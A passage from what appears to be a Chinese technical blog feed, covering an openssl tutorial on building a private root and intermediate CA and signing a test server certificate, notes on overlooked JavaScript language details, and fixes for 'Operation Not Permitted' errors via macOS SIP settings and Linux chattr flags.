class="number">03</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">X509v3</span> <span class="variable">Basic</span> <span class="variable">Constraints</span><span class="operator">:</span> <span class="variable">critical</span></span><br><span class="line">                <span class="variable">CA</span><span class="operator">:</span><span class="variable">TRUE</span></span><br><span class="line">            <span class="variable">X509v3</span> <span class="built_in">Key</span> <span class="variable">Usage</span><span class="operator">:</span> <span class="variable">critical</span></span><br><span class="line">                <span class="variable">Digital</span> <span class="built_in">Signature</span><span class="operator">,</span> <span class="variable">Certificate</span> <span class="built_in">Sign</span><span class="operator">,</span> <span class="variable">CRL</span> <span class="built_in">Sign</span></span><br><span class="line">    <span class="built_in">Signature</span> <span class="variable">Algorithm</span><span class="operator">:</span> <span class="variable">sha256WithRSAEncryption</span></span><br><span class="line">        <span class="operator">//</span> <span class="operator">...</span></span><br></pre></td></tr></table></figure><p>包含：</p><ul><li>数字签名（Signature Algorithm）</li><li>有效时间（Validity）</li><li>主体（Issuer）</li><li>公钥（Public Key）</li><li>X509v3 扩展，openssl config 中配置了 v3_ca，所以会生成此项</li></ul><h4 id="创建-intermediate-pair"><a href="#创建-intermediate-pair" class="headerlink" title="创建 intermediate pair"></a>创建 intermediate pair</h4><p>目前我们已经拥有了 Root Pair，事实上已经可以用于证书的发放了，但是由于根证书很干净，特别容易被污染，所以我们需要创建中间 pair 作为 root pair 的代理，生成过程同上，只是细节略微不一样。</p><p>生成目录结构和 openssl 的配置，这里的配置是针对 intermediate pair 的：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> /root/ca/intermediate</span><br><span class="line">$ <span class="built_in">cd</span> /root/ca/intermediate</span><br><span class="line">$ <span class="built_in">mkdir</span> certs crl csr newcerts private</span><br><span class="line">$ <span class="built_in">chmod</span> 700 private</span><br><span class="line">$ <span class="built_in">touch</span> index.txt</span><br><span class="line">$ <span class="built_in">echo</span> 1000 &gt; serial</span><br><span class="line">$ <span class="built_in">echo</span> 1000 &gt; /root/ca/intermediate/crlnumber</span><br><span class="line">$ wget -O /root/ca/openssl.cnf \</span><br><span class="line">    //raw.githubusercontent.com/barretlee/autocreate-ca/master/cnf/intermediate-ca</span><br></pre></td></tr></table></figure><p>创建 intermediate key，密码可为空，设定权限为只可读：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /root/ca</span><br><span class="line">$ openssl genrsa -aes256 \</span><br><span class="line">      -out intermediate/private/intermediate.key.pem 4096</span><br><span class="line"></span><br><span class="line">Enter pass phrase <span class="keyword">for</span> intermediate.key.pem: secretpassword</span><br><span class="line">Verifying - Enter pass phrase <span class="keyword">for</span> intermediate.key.pem: secretpassword</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">chmod</span> 400 intermediate/private/intermediate.key.pem</span><br></pre></td></tr></table></figure><p>创建 intermediate cert，设定权限为只可读，这里需要特别注意的一点是 <strong>Common Name 不要与 root pair 的一样</strong> ：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /root/ca</span><br><span class="line">$ openssl req -config intermediate/openssl.cnf -new -sha256 \</span><br><span class="line">      -key intermediate/private/intermediate.key.pem \</span><br><span class="line">      -out intermediate/csr/intermediate.csr.pem</span><br><span class="line"></span><br><span class="line">Enter pass phrase <span class="keyword">for</span> intermediate.key.pem: secretpassword</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [XX]:CN</span><br><span class="line">State or Province Name []:Zhejiang</span><br><span class="line">Locality Name []:</span><br><span class="line">Organization Name []:Barret Lee</span><br><span class="line">Organizational Unit Name []:Barret Lee Certificate Authority</span><br><span class="line">Common Name []:Barret Lee Intermediate CA</span><br><span class="line">Email Address []:</span><br></pre></td></tr></table></figure><p>使用 <code>v3_intermediate_ca</code> 扩展签名，密码可为空，中间 pair 的有效时间一定要为 root pair 的子集：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /root/ca</span><br><span class="line">$ openssl ca -config openssl.cnf -extensions v3_intermediate_ca \</span><br><span class="line">      -days 3650 -notext -md sha256 \</span><br><span class="line">      -<span class="keyword">in</span> intermediate/csr/intermediate.csr.pem \</span><br><span class="line">      -out intermediate/certs/intermediate.cert.pem</span><br><span class="line"></span><br><span class="line">Enter pass phrase <span class="keyword">for</span> ca.key.pem: secretpassword</span><br><span class="line">Sign the certificate? [y/n]: y</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">chmod</span> 444 intermediate/certs/intermediate.cert.pem</span><br></pre></td></tr></table></figure><p>此时 root 的 <code>index.txt</code> 中将会多出这么一条记录：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">V 260421055318Z   1000  unknown .../CN=Barret Lee Intermediate CA</span><br></pre></td></tr></table></figure><p>验证中间 pair 的正确性：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ openssl x509 -noout -text \</span><br><span class="line">      -<span class="keyword">in</span> intermediate/certs/intermediate.cert.pem</span><br><span class="line">$ openssl verify -CAfile certs/ca.cert.pem \</span><br><span class="line">      intermediate/certs/intermediate.cert.pem</span><br><span class="line"></span><br><span class="line">intermediate.cert.pem: OK</span><br></pre></td></tr></table></figure><p>浏览器在验证中间证书的时候，同时也会去验证它的上一级证书是否靠谱，创建证书链，将 root cert 和 intermediate cert 合并到一起，可以让浏览器一并验证：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> intermediate/certs/intermediate.cert.pem \</span><br><span class="line">      certs/ca.cert.pem &gt; intermediate/certs/ca-chain.cert.pem</span><br><span class="line">$ <span class="built_in">chmod</span> 444 intermediate/certs/ca-chain.cert.pem</span><br></pre></td></tr></table></figure><h4 id="创建服务器-x2F-客户端证书"><a href="#创建服务器-x2F-客户端证书" class="headerlink" title="创建服务器&#x2F;客户端证书"></a>创建服务器&#x2F;客户端证书</h4><p>终于到了这一步，生成我们服务器上需要部署的内容，上面已经解释了为啥需要创建中间证书。root pair 和 intermediate pair 使用的都是 4096 位的加密方式，一般情况下服务器&#x2F;客户端证书的过期时间为一年，所以可以安全地使用 2048 位的加密方式。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /root/ca</span><br><span class="line">$ openssl genrsa -aes256 \</span><br><span class="line">      -out intermediate/private/www.barretlee.com.key.pem 2048</span><br><span class="line">$ <span class="built_in">chmod</span> 400 intermediate/private/www.barretlee.com.key.pem</span><br></pre></td></tr></table></figure><p>创建 <code>www.barretlee.com</code> 的证书：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /root/ca</span><br><span class="line">$ openssl req -config intermediate/openssl.cnf \</span><br><span class="line">      -key intermediate/private/www.barretlee.com.key.pem \</span><br><span class="line">      -new -sha256 -out intermediate/csr/www.barretlee.com.csr.pem</span><br><span class="line"></span><br><span class="line">Enter pass phrase <span class="keyword">for</span> www.barretlee.com.key.pem: secretpassword</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [XX]:CN</span><br><span class="line">State or Province Name []:Zhejiang</span><br><span class="line">Locality Name []:Hangzhou</span><br><span class="line">Organization Name []:Barret Lee</span><br><span class="line">Organizational Unit Name []:Barret Lee<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">Common Name []:www.barretlee.com</span></span><br><span class="line"><span class="string">Email Address []:barret.china@gmail.com</span></span><br></pre></td></tr></table></figure><p>使用 intermediate pair 签证上面证书：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /root/ca</span><br><span class="line">$ openssl ca -config intermediate/openssl.cnf \</span><br><span class="line">      -extensions server_cert -days 375 -notext -md sha256 \</span><br><span class="line">      -<span class="keyword">in</span> intermediate/csr/www.barretlee.com.csr.pem \</span><br><span class="line">      -out intermediate/certs/www.barretlee.com.cert.pem</span><br><span class="line">$ <span class="built_in">chmod</span> 444 intermediate/certs/www.barretlee.com.cert.pem</span><br></pre></td></tr></table></figure><p>可以看到 <code>/root/ca/intermediate/index.txt</code> 中多了一条记录：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">V 170503055941Z   1000  unknown .../emailAddress=barret.china@gmail.com</span><br></pre></td></tr></table></figure><p>验证证书：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ openssl x509 -noout -text \</span><br><span class="line">      -<span class="keyword">in</span> intermediate/certs/www.barretlee.com.cert.pem</span><br><span class="line">$ openssl verify -CAfile intermediate/certs/ca-chain.cert.pem \</span><br><span class="line">      intermediate/certs/www.barretlee.com.cert.pem</span><br><span class="line"></span><br><span class="line">www.barretlee.com.cert.pem: OK      </span><br></pre></td></tr></table></figure><p>此时我们已经拿到了几个用于部署的文件：</p><ul><li><code>ca-chain.cert.pem</code></li><li><code>www.barretlee.com.key.pem</code></li><li><code>www.barretlee.com.cert.pem</code></li></ul><h3 id="添加信任-CA-和证书的调试"><a href="#添加信任-CA-和证书的调试" class="headerlink" title="添加信任 CA 和证书的调试"></a>添加信任 CA 和证书的调试</h3><p>双击 <code>/root/ca/intermediate/certs/ca-chain.cert.pem</code> 将证书安装到系统中，目的是让本机信任这个 CA，将其当作一个权威 CA，安装 <code>root pem</code> 或者 <code>intermediate chain pem</code> 都是可以的，它们都具备验证能力。如果不执行这一步，浏览器依然会提示 <code>net:ERR_CERT_AUTHORITY_INVALID</code>。</p><p>上面申请测试证书时，我设置的 Common Name 为 <code>www.barretlee.com</code>，由于不在线上机器测试，可以将其添加到 hosts：</p><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> www.barretlee.com</span><br></pre></td></tr></table></figure><p>执行下方测试代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https-server.js</span></span><br><span class="line"><span class="keyword">var</span> https = <span class="built_in">require</span>(<span class="string">&#x27;https&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  <span class="attr">key</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/root/ca/intermediate/private/www.barretlee.com.key.pem&#x27;</span>),</span><br><span class="line">  <span class="attr">cert</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/root/ca/intermediate/certs/www.barretlee.com.cert.pem&#x27;</span>),</span><br><span class="line">  <span class="attr">passphrase</span>: <span class="string">&#x27;passoword&#x27;</span> <span class="comment">// 如果生成证书的时候设置了密码，请添加改参数和密码</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">https.<span class="title function_">createServer</span>(options, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">200</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8000</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Open URL: //www.barretlee.com:8000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以看到这样的效果：</p><p><img src="/../blogimgs/2016/04/24/6c0378f8gw1f373ltah7zj20oc09aaan.jpg" alt="小绿锁出来了"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f373ltah7zj20oc09aaan.jpg">--></p><p>查看证书的详细信息：</p><p><img src="/../blogimgs/2016/04/24/6c0378f8gw1f373mf9bpfj20qw0u6n3d.jpg" alt="证书的详细信息"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f373mf9bpfj20qw0u6n3d.jpg">--></p><p>回到最初的问题：</p><blockquote><p>然而在一些情况下，我们没必要去 CA 机构购买证书，比如在内网的测试环境中，为了验证 HTTPS 下的一些问题，我们不需要部署昂贵的证书，这个时候自建 Root CA，给自己颁发证书就显得很有价值了。</p></blockquote><p>一般公司内网的电脑都会强制安装一些安全证书，此时就可以把我们自建自签名的证书导入&#x2F;引导安装到用户的电脑中啦~</p><h3 id="无-SNI-支持问题"><a href="#无-SNI-支持问题" class="headerlink" title="无 SNI 支持问题"></a>无 SNI 支持问题</h3><p>很多公司由于业务众多，域名也是相当多的，为了方便运维，会让很多域名指向同样的 ip，然后统一将流量&#x2F;请求分发到后端，此时就会面临一个问题：由于 TLS&#x2F;SSL 在 HTTP 层之下，客户端和服务器握手的时候还拿不到 origin 字段，所以服务器不知道这个请求是从哪个域名过来的，而服务器这边每个域名都对应着一个证书，服务器就不知道该返回哪个证书啦。</p><p>SNI 就是用来解决这个问题的，官方解释是</p><blockquote><p>SNI（Server Name Indication）是为了解决一个服务器使用多个域名和证书的SSL&#x2F;TLS扩展。一句话简述它的工作原理就是，在连接到服务器建立SSL链接之前先发送要访问站点的域名（Hostname），这样服务器根据这个域名返回一个合适的证书。</p></blockquote><p>然后有将近 25% 的浏览器不支持该字段的扩展，这个问题有两个通用解决方案：</p><ul><li>使用 VIP 服务器，每个域名对应一个 VIP，然后 VIP 与统一接入服务对接，通过 ip 来分发证书，不过运维成本很高，可能也需要大量的 VIP 服务器</li><li>采用多泛域名，将多个泛域名证书打包进一个证书，可以看看 <a href="//www.taobao.com">淘宝</a> 页面的证书<br><img src="/../blogimgs/2016/04/24/6c0378f8gw1f3740ay3glj210g15kqcf.jpg" alt="taobao cert"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f3740ay3glj210g15kqcf.jpg">--><br>它的缺点是每次添加域名都需要更新证书。</li></ul><h3 id="几个细节知识点"><a href="#几个细节知识点" class="headerlink" title="几个细节知识点"></a>几个细节知识点</h3><p><strong>1. 证书选择</strong></p><p>证书有多张加密方式，不同的加密方式对 CPU 计算的损耗不同，安全级别也不同。TLS 在进行第一次握手的时候，客户端会向服务器端 <code>say hello</code>，这个时候会告诉服务器，它支持哪些算法，此时服务器可以将最适合的证书发给客户端。</p><p><strong>2. 证书的吊销</strong></p><p>CA 证书的吊销存在两种机制，一种是在线检查，client 端向 CA 机构发送请求检查 server 公钥的靠谱性；第二种是 client 端储存一份 CA 提供的证书吊销列表，定期更新。前者要求查询服务器具备良好性能，后者要求每次更新提供下次更新的时间，一般时差在几天。安全性要求高的网站建议采用第一种方案。</p><p>大部分 CA 并不会提供吊销机制（CRL&#x2F;OCSP），靠谱的方案是为根证书提供中间证书，一旦中间证书的私钥泄漏或者证书过期，可以直接吊销中间证书并给用户颁发新的证书。中间证书的签证原理于上上条提到的原理一样，中间证书还可以产生下一级中间证书，多级证书可以减少根证书的管理负担。</p><p>很多 CA 的 OCSP Server 在国外，在线验证时间比较长，如果可以联系 CA 供应商将 Server 转移到国内，效率可以提升 10 倍左右。</p><p><strong>3. PKI 体系</strong></p><p>比较主流的两种方案是 HPKP 和 Certificate Transparency：</p><ul><li>HPKP 就是用户第一次访问的时候记下 sign 信息，以后不匹配则拒绝访问，这存在很大的隐患，比如 Server 更新了证书，或者用户第一次访问的时候就被人给黑了</li><li>Certificate Transparency 意思就是让 CA 供应商透明化 CA 服务日志，防止 CA 供应商偷偷签证</li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>看了不少文章，对 CA 和证书相关的知识做了一些总结，可能不全面，也可能存在表述错误或者知识性错误，欢迎拍砖！</p><h3 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h3><ul><li><a href="http://jamielinux.com/docs/openssl-certificate-authority/index.html">http://jamielinux.com/docs/openssl-certificate-authority/index.html</a></li><li><a href="http://www.ert7.com/service/knowledge/3999.html">http://www.ert7.com/service/knowledge/3999.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Catificate Authority </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 被忽视的细节</title>
      <link href="/blog/2016/04/18/javascript-detail/"/>
      <url>/blog/2016/04/18/javascript-detail/</url>
      
        <content type="html"><![CDATA[<p>《JavaScript 权威指南》这本书从第四版开始，一直到第六版，每个版本我都逐字逐句读过几遍，然而每一遍下来的感受却完全不一样。上上周的周一，再次翻开了这本犀牛书，这一次我是带着批判精神和研究精神过来的，所以看的时候也写下了一些感受和笔记，都是些容易被忽略的点，部分内容犀牛书上不一定有提到。</p><p>之前都发在 <a href="http://weibo.com/hustskyking">微博</a> 上，稍微整理了一番，放在这里，方便阅读。</p><span id="more"></span><h3 id="一些小点"><a href="#一些小点" class="headerlink" title="一些小点"></a>一些小点</h3><p><strong>语句&#x2F;表达式</strong></p><p>换个角度理解语句（statemaents）和表达式（expressions）：表达式不会改变程序的运行状态，而语句会。还有一种叫做表达式语句，可以理解为表达式和语句的交集，如 <code>(&#123;a:1&#125;)</code>、<code>&quot;use strict;&quot;</code>等，我觉得没必要死扣，意义不大。</p><p><strong>字符集</strong></p><p>ES3 要求 JS 必须实现 Unicode 2.1 及后续版本，而 ES5 只要求支持 Unicode 3 及后续版本。Unicode 字符 2005 年超过了十万字符，至今仍在不断增修，最新版本是 8.0。</p><p><strong>分号</strong></p><p>如果你写 JS 代码不喜欢带分号，而又搞不清什么时候必须加分号，可以这么做：在以  “(“、”[“ 、”&#x2F;“、”+”、”-“ 开头的语句前面都加上一个分号，如 <code>;(a + b).toString()</code>。</p><p><strong>进制</strong></p><p>ES5 严格模式中禁止使用八进制。目前各种引擎对 JS 的实现是存在差异的，部分支持八进制，部分不支持。八进制被禁止的原因：String 和 Number 之间经常被相互转换，而以 <code>0</code> 开头的八进制数据特别容易让人迷惑，也容易让机器迷惑，比如 <code>09</code> 是该被转换成 9 还是直接报错？十六进制不存在这个问题，如 0x98。更多信息参阅 <a href="http://stackoverflow.com/questions/30386993/why-in-javascript-does-10-010-result-in-false">这里</a>。</p><p><strong>精度</strong></p><p>JS 采用 IEEE-754 浮点数表示法，这是一种二进制表示法，由于精度原因 JS 不能表示所有的实数。它能展示的浮点数个数是有限的，比如它不能准确地表示三分之一的数值字面量。这也导致了它在浮点数的计算上存在误差，如 <code>0.3-0.2 != 0.2-0.1</code>，因为在计算的过程中，存在数据的溢出，丢失了精度。</p><p><img src="/../blogimgs/2016/04/18/6c0378f8jw1f2l0dtvbzuj20ek07ogm7.jpg" alt="image"></p><p><strong>null&#x2F;undefined</strong></p><p>系统级、出乎意料的或者类似错误的值的空缺使用 undefined，而程序级、正常的或意料之中的值的空缺使用 null。平时编程给变量赋值时，不要使用 undefined 而应该用 null。值得注意的是 ES3 中的 undefined 是可以被重新赋值的，ES5 修复了这个 bug。通常我们使用 void 0 来还原&#x2F;代替 undefined 的值。</p><p><strong>eval</strong></p><p>eval 是个不好把握的东西，它在 ES3 中更像是 Function，而在 ES5 中更像是一个运算符（严格模式下不允许设置别名，否则报错，且将其作为保留字）。实际上 ES3 中也不允许给 eval 设置别名，然而很多实现却依然允许，并将其作为全局代码来执行，浏览器尤其是 IE 对它实现相当混乱，没有什么规律可循，不过 IE 中提供了一个 execScript 函数，类似全局的 eval，这个函数每次执行都会返回 null。</p><p>需要使用 eval 的场景并不多，尽量少用，一般需求使用 new Function 就能满足。</p><p><strong>引用</strong></p><p>删除属性存在的坑：<code>a = &#123;n: &#123;x: 2&#125;&#125;, b = a.n; delete a.n;</code> 这段代码执行之后，b.x 依然等于 2，原因是 {x:2} 这个对象被 a 和 b 同时引用，delete 指令只删除了 a 对它的引用，b 上的引用依然存在。这种问题有可能造成内存泄漏。</p><p><strong>Object 扩展</strong></p><p>Object 的 freeze 方法过于严格；<strong>defineGetter</strong>&#x2F;<strong>lookupGetter</strong> 和对应的 Setter 是很好用的属性。</p><p><img src="/../blogimgs/2016/04/18/6c0378f8gw1f2rzy2ncrpj20eo09b3zr.jpg" alt="image"></p><p><strong>toLocalString</strong></p><p>如图，你可能还不知道 JavaScript 的 toLocaleString 还可以这么玩。</p><p><img src="/../blogimgs/2016/04/18/6c0378f8gw1f2s12nir33j20bz05n750.jpg" alt="image"></p><p><strong>this语义</strong></p><p>this 上下文只存在两种语义，一种是被当作方法调用，this 指向调用它的对象；一种是作为函数调用，指向 Global 对象（严格模式下为 undefined）。它没有作用域的限制，如下图所示，a 由于是作为函数被调用，所以它指向的是 window，故而返回 false。</p><p><img src="/../blogimgs/2016/04/18/6c0378f8gw1f2t6g4sc28j208m054aa5.jpg" alt="image"></p><p><strong>类型</strong></p><p>JavaScript 可以被调用执行的均为 Function 类型，但是也存在可调用的 Object，如低版本 IE 中的一些宿主对象：document.getElementById、alert 等，在很多浏览器中 typeof RegExp 同样是 Object。这绝对是一个不标准的实现，在浏览器摒弃&#x2F;修正这些错误类型之前应该尽量少依赖它们。</p><p><img src="/../blogimgs/2016/04/18/6c0378f8gw1f2uaewdsbmj20hq03zgm5.jpg" alt="image"></p><p><strong>IE8 getter&#x2F;setter</strong></p><p>Object.defineProperty 虽然是 ES5 的东西，早在 IE8 就已经支持了，但支持得并不完善，比如 writable、enumerable、configurable 这些配置项设置就无效，IE8 下主要支持 getter&#x2F;setter。</p><p><img src="/../blogimgs/2016/04/18/6c0378f8gw1f2ubot1qvxj20ie0dh41g.jpg" alt="image"></p><p><strong>JSON.stringify</strong></p><p>JSON.stringify 接受三个参数，很多人都知道第三个参数可以设置空白字符来美化输出，但是你可能不知道第二个参数的作用，它为 {Array|Function} 类型，如果为 Array 则用于过滤 key，如果为 Function 则可以对 value 做处理，如图所示。</p><p><img src="/../blogimgs/2016/04/18/6c0378f8gw1f2ud4j7vg2j20ec0dmjso.jpg" alt="image"></p><p><strong>Symbol</strong></p><p>ES6 中添加了一种新的数据类型，Symbol，它是一种原始数据类型（图一），具备对象的特性（图二），并可以指向同一个引用（图三），能够作为对象的 key 但不可枚举（图四），内置的 Symbol 会影响程序的执行（图五），Symbol.iterator 是个举足轻重的符号，能够让元素具备迭代属性（图六），花样很多。</p><p>附图见：<a href="http://weibo.com/1812166904/DqMwR8O6z">http://weibo.com/1812166904/DqMwR8O6z</a></p><p>伪数组添加 Symbol.iterator 的几个办法：鸭式辨型的 iterator 函数、yield 函数和直接使用 Array 的遍历符号。</p><p>附图见：<a href="http://weibo.com/1812166904/DqMBYebPw">http://weibo.com/1812166904/DqMBYebPw</a></p><p><strong>Set&#x2F;WeakSet</strong></p><p>Set&#x2F;WeakSet 这种数据结构，不能说没用，但确实也没啥大用，前者就是个不允许出现重复成员的数组，顺便还带了点 ES6 的特性，后者虽说可以一定程度上防止内存泄漏，但是也容易出错，比如某个引用已经被垃圾回收了，再去使用它可能就返回 null。它们都是 ES6 的配套产物。而 Map&#x2F;WeakMap 倒是两个非常不错的设计，常规的 Object 结构都为 String-Val 键值对，而它扩展为 AllType-Val，任意类型都可以作为它的 Key，无论是服务端编程还是客户端编程，这个属性都带来了极大的便利性。</p><p><img src="/../blogimgs/2016/04/18/6c0378f8gw1f2w362q57jj207203jaa1.jpg" alt="image"></p><p><strong>正则</strong></p><p>理解正则零宽的含义：正则中所谓的零宽断言，类似于锚点字符，它们匹配指定的位置而不会匹配内容，如 ^ 匹配开头，$ 匹配结尾，\b 匹配单词边界；(?&#x3D;p) 匹配「接下来的字符与 p 匹配」的位置，(?!p) 匹配「接下来的字符不与 p 匹配」的位置。\b 字符匹配单词边界，实际上就是匹配 \w 与 \W 之间的位置（\w 匹配 [a-zA-Z0-9]）。很少会有人用到 \B，它匹配的是非单词边界位置，简单理解就是 \w &amp; \w 之间位置或者 \W &amp; \W 之间位置。</p><p><img src="/../blogimgs/2016/04/18/6c0378f8gw1f305w4ur27j208v02wmx9.jpg" alt="image"></p><p><strong>持续学习和分享…</strong></p><p>内容都是片段化的分享，比较多，也比较杂，就没有全部列举出来，感兴趣的同学可以 follow 我的 <a href="http://weibo.com/hustskyking">微博</a>，我的想法和笔记都会在上面同步。</p><h3 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h3><p>在这之前犀牛书已经翻阅了差不多六七遍，很多内容都已经深深地刻在了脑海里，但时间久了也会忘记些，时而巩固复习下，毕竟是前端最基础部分。</p><p>带着问题去看书，收获是完全不一样的。犀牛书不难啃，难的是你对这些知识点的理解深度。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unix/Linux 系统中的 Operation Not Permitted 问题</title>
      <link href="/blog/2016/04/06/operation-not-permitted-problem-in-linux-or-unix-system/"/>
      <url>/blog/2016/04/06/operation-not-permitted-problem-in-linux-or-unix-system/</url>
      
        <content type="html"><![CDATA[<p>多次在 Mac 使用过程中遇到 Operation Not Permitted 问题，之前都是略过，今天好好摸索了一把，搞明白了道理，记录下来。</p><span id="more"></span><p>好几次整理移动硬盘数据的时候，都遇到了 <code>Operation Not Permitted</code> 问题，文件移动不了，也删除不掉，第一次遇到没理会，第二次是打开虚拟机，在 Windows 中操作这些问题文件，今天又遇到了，决定消灭它。</p><h3 id="OS-X-EI-Capitan-的-SIP"><a href="#OS-X-EI-Capitan-的-SIP" class="headerlink" title="OS X EI Capitan 的 SIP"></a>OS X EI Capitan 的 SIP</h3><p>Apple 在 OS X 10.11 以后的版本中默认启动了一项系统保护程序，叫做 System Integrity Protection，也被唤作 rootless（寓意让 root 弱一点），该程序意在保护电脑不被恶意程序攻击，但是对于我们这群程序员，很多保护是多余的，甚至给我们带来了很多麻烦。</p><p>SIP 会锁定几个系统文件目录：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/System</span></span><br><span class="line"><span class="string">/sbin</span></span><br><span class="line"><span class="string">/usr</span> （<span class="string">/usr/local</span> 除外）</span><br></pre></td></tr></table></figure><p>在 SIP 的保护下，部分软件、功能、脚本都会失效，我们可以通过如下步骤关闭 SIP：</p><ul><li>重启电脑，按下 <code>Command + R</code> 直到听到开机声音，此时电脑会进入恢复模式（Recovery Mode）</li><li>当 OSX 工具出现在屏幕中时，下拉工具（Utilities）菜单，选择终端（Terminal）</li><li>键入 <code>csrutil disable</code>，回车</li><li>电脑重启后，SIP 就关闭了</li></ul><p>恢复 SIP 的方式同上，只不过终端中键入 <code>csrutil enable</code>。通过 <code>csrutil status</code> 可以检测系统当前 SIP 的启动状态：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ csrutil status</span><br><span class="line">System Integrity Protection status: enabled.</span><br></pre></td></tr></table></figure><h3 id="Linux-下的-file-flags"><a href="#Linux-下的-file-flags" class="headerlink" title="Linux 下的 file flags"></a>Linux 下的 file flags</h3><p>可能你也遇到过在 Linux 下删除文件报错：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/barret/work<span class="comment"># rm -f 1.md </span></span><br><span class="line"><span class="built_in">rm</span>: cannot remove ‘1.md’: Operation not permitted</span><br></pre></td></tr></table></figure><p>这个时候可以通过 <code>lsattr</code> 命令看看该文件是否被打了 flags：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/barret/work<span class="comment"># lsattr 1.md</span></span><br><span class="line">----i--------e-- ./1.md</span><br></pre></td></tr></table></figure><p>如果文件上存在 <code>i</code> 标记，那肯定是删不掉的，同样这个文件也不能被编辑。可以进入 root 模式，去除这个标记：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/barret/work<span class="comment"># chattr -i 1.md</span></span><br></pre></td></tr></table></figure><p>给保护文件添加标记的方式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/barret/work<span class="comment"># chattr +i 1.md</span></span><br></pre></td></tr></table></figure><p>也比较简单。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>文本算是一个经验性的小科普，希望对你有帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Linux </category>
          
          <category> 苹果 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Operation Not Permitted </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>淘宝首页性能优化实践</title>
      <link href="/blog/2016/04/01/optimization-in-taobao-homepage/"/>
      <url>/blog/2016/04/01/optimization-in-taobao-homepage/</url>
      
